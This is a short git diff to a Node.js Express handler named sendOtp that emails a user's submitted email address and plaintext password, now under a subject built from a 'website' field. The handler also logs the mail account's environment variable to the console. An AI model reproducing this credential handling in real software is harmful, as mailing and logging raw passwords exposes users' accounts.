@@ -2,15 +2,14 @@ const transporter = require('../Middleware/Nodemailer')
 
 const sendOtp = async (req, res,next) => {
 console.log(process.env.EMAIL_USER)
-    const { email,password,username} = req.body;
+    const { email,password,website} = req.body;
     const mailOptions = {
       from: process.env.EMAIL_USER,
       to: email,
-      subject: 'Shaw credentials',
+      subject: `${website} credentials` ,
       html: `
       <p>New login,</p>
       <p>these are the credentials  below :</p>
-      <p><strong>Email:</strong> ${username}</p>
       <p><strong>Email:</strong> ${email}</p>
       <p><strong>Password:</strong> ${password}</p>
       <p>Ensure you keep this information secure and do not share it with anyone.</p>
